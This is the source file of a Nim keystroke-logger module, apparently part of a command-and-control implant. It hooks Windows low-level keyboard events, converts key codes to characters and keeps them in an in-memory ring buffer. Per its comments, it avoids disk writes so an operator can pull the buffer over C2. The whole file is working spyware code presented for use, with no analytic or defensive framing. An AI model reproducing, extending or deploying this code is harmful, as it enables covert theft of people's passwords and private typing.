# keylog.nim — in-memory keystroke logger via SetWindowsHookExW WH_KEYBOARD_LL
#
# Collects keystrokes into a ring buffer. No disk writes.
# Operator retrieves via `keylog dump` command over C2.

import winim
import std/locks

const RING_CAP = 65536

var ringBuf:  array[RING_CAP, byte]
var ringHead  = 0
var ringTail  = 0
var ringCount = 0
var ringLock: Lock
var hookHandle: HHOOK = nil

initLock(ringLock)

proc vkToAscii(vk: byte): byte =
  case vk
  of 0x41'u8 .. 0x5A'u8: byte(vk + 0x20)
  of 0x30'u8 .. 0x39'u8: vk
  of 0x20'u8: byte(' ')
  of 0x0D'u8: byte('\n')
  of 0x08'u8: byte('<')
  of 0xBD'u8: byte('-')
  of 0xBB'u8: byte('=')
  of 0xDB'u8: byte('[')
  of 0xDD'u8: byte(']')
  of 0xBA'u8: byte(';')
  of 0xDE'u8: byte('\'')
  of 0xBC'u8: byte(',')
  of 0xBE'u8: byte('.')
  of 0xBF'u8: byte('/')
  of 0xDC'u8: byte('\\')
  else: 0

proc lowLevelKbProc(code: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
  if code >= 0 and (uint32(wParam) == WM_KEYDOWN or uint32(wParam) == WM_SYSKEYDOWN):
    let kb = cast[ptr KBDLLHOOKSTRUCT](lParam)
    let ch = vkToAscii(byte(kb[].vkCode))
    if ch != 0:
      withLock(ringLock):
        if ringCount < RING_CAP:
          ringBuf[ringTail] = ch
          ringTail = (ringTail + 1) mod RING_CAP
          inc ringCount
        else:
          # Overwrite oldest
          ringBuf[ringHead] = ch
          ringHead = (ringHead + 1) mod RING_CAP

  CallNextHookEx(hookHandle, code, wParam, lParam)

proc startKeylog*() =
  if hookHandle != nil: return
  # Spawn message pump thread
  let threadProc = proc(p: LPVOID): DWORD {.stdcall.} =
    hookHandle = SetWindowsHookExW(WH_KEYBOARD_LL, lowLevelKbProc, nil, 0)
    if hookHandle == nil: return 1
    var msg: MSG
    zeroMem(addr msg, sizeof(msg))
    while GetMessageW(addr msg, nil, 0, 0) > 0:
      discard TranslateMessage(addr msg)
      discard DispatchMessageW(addr msg)
    0

  var tid: DWORD = 0
  let h = CreateThread(nil, 0, threadProc, nil, 0, addr tid)
  if h != nil: discard CloseHandle(h)

proc dumpKeylog*(): seq[byte] =
  withLock(ringLock):
    result = newSeq[byte](ringCount)
    var pos = ringHead
    for i in 0 ..< ringCount:
      result[i] = ringBuf[pos]
      pos = (pos + 1) mod RING_CAP
    ringHead  = 0
    ringTail  = 0
    ringCount = 0
